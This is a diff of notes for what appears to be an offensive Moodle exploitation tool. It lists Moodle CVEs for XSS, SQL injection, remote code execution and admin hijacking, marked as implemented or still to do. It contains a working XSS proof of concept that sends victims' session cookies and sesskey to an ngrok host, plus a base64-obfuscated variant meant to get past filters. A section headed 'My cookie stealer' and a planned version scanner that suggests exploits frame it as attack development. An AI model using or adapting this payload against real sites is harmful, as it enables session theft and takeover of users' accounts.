@@ -21,11 +21,11 @@ My cookie stealer:
 
 https://blog.innerht.ml/tag/clickjacking/ good demo of a button that follows the mouse.
 
-https://moodle.org/mod/forum/discuss.php?d=384010 3.6 login as, hijack admin account
+https://moodle.org/mod/forum/discuss.php?d=384010 3.6 login as, hijack admin account implemented in clickjack.html
 
-https://www.cvedetails.com/cve/CVE-2018-1045/ 3.3.4 XSS in calendar event name
+https://www.cvedetails.com/cve/CVE-2018-1045/ 3.3.4 XSS in calendar event name todo
 
-https://moodle.org/mod/forum/discuss.php?d=345915 3.2.1 xss via url
+https://moodle.org/mod/forum/discuss.php?d=345915 3.2.1 xss via url implemented
 
 POC:
 http://localhost/mod/assign/view.php?id=2&action=view"onload="document.body.appendChild(document.createElement('img')).src=('https://5fc418e2.ngrok.io/?session='.concat(document.cookie,'|',M.cfg.sesskey))
@@ -38,21 +38,20 @@ or if eval is filtered:
 
 "onload="new Function(window.atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKSkuc3JjPSgnaHR0cHM6Ly81ZmM0MThlMi5uZ3Jvay5pby8/c2Vzc2lvbj0nLmNvbmNhdChkb2N1bWVudC5jb29raWUsJ3wnLE0uY2ZnLnNlc3NrZXkpKQ=='))()
 
-https://moodle.org/mod/forum/discuss.php?d=381230 3.6 could use a clickhijack to self
 
 https://moodle.org/mod/forum/discuss.php?d=384011 3.6 (fresh!) enum events
 
 https://www.cvedetails.com/cve/CVE-2017-2641/ used by exploit below
 
-https://www.exploit-db.com/exploits/41828 3.2.1 SQL injection
+https://www.exploit-db.com/exploits/41828 3.2.1 SQL injection implemented
 
-https://www.exploit-db.com/exploits/46551 3.4.1 RCE, CVE below
+https://www.exploit-db.com/exploits/46551 3.4.1 RCE, CVE below TODO
 
 https://www.cvedetails.com/cve/CVE-2018-1133/ 3.4.2 remote code exec for teacher "Calculated question"
 
 fresher:
 
-https://www.cvedetails.com/cve/CVE-2018-14630/ 3.5.2 remote code exec for (teacher?) "quiz import"
+https://www.cvedetails.com/cve/CVE-2018-14630/ 3.5.2 remote code exec for (teacher?) "quiz import" probably wont be done
 
 Features:
 1. scan: detect version (working!), suggest supported exploits
